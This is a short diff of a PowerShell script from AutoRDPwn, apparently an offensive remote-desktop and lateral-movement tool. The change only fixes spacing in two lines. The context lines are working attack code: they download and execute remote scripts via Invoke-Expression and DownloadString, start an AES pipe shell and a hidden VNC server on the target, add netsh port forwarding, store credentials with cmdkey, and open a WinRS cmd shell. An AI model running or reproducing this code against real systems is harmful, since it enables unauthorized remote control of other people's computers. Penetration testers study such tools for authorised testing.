@@ -557,9 +557,9 @@ function Remove-Exclusions {
     Write-Host ; Write-Host "$txt33" -NoNewLine ; Write-Host $hostname.tolower() -ForegroundColor Gray ;  if($hash) { cmdkey /add:$computer /user:AutoRDPwn /pass:AutoRDPwn 2>&1> $null }
     $version = invoke-command -session $RDP[0] -scriptblock { (Get-WmiObject -class Win32_OperatingSystem).Caption } ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host
 
-    if($smbshell){ invoke-command -session$RDP[0] -scriptblock { Start-Job -ScriptBlock { 
+    if($smbshell){ invoke-command -session $RDP[0] -scriptblock { Start-Job -ScriptBlock { 
     Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-PipeShell.ps1')
-    Invoke-PipeShell -mode server -aeskey AutoRDPwn_AESKey -server localhost -Pipe "Shared Folder" } 2>&1>$null }}
+    Invoke-PipeShell -mode server -aeskey AutoRDPwn_AESKey -server localhost -Pipe "Shared Folder" } 2>&1> $null }}
 
     if($vncserver){ $base64 = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-VNCServer.ps1')
     invoke-command -session $RDP[0] -scriptblock { $base64array = ($using:base64).ToCharArray() ; [array]::Reverse($base64array) ; -join $base64array 2>&1> $null
@@ -649,7 +649,7 @@ Write-Host "--------------------------------------------------------------------
 try { while($true) { Get-Content -wait $env:localappdata\config.dat }} finally { Write-Host ; Write-Host "Ctrl+C pressed, exiting.." -ForegroundColor Red ; Start-Sleep -milliseconds 2000 }}}
 
 if ($smbshell){ Write-Host; Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-PipeShell.ps1')
-Invoke-PipeShell -mode client -server$computer -aeskey AutoRDPwn_AESKey -i -pipe "Shared Folder" -timeout 120 }
+Invoke-PipeShell -mode client -server $computer -aeskey AutoRDPwn_AESKey -i -pipe "Shared Folder" -timeout 120 }
 
 if ($remoteforward){ invoke-command -session $RDP[0] -scriptblock { netsh interface portproxy add v4tov4 listenport=$using:rlport listenaddress=$using:rlhost connectport=$using:rrport connectaddress=$using:rrhost }}
 if ($console){ $PlainTextPassword = ConvertFrom-SecureToPlain $password ; Clear-Host ; Write-Host ">> $txt39 <<" ; Write-Host ; WinRS -r:$computer -u:$user -p:$PlainTextPassword "cmd" }}
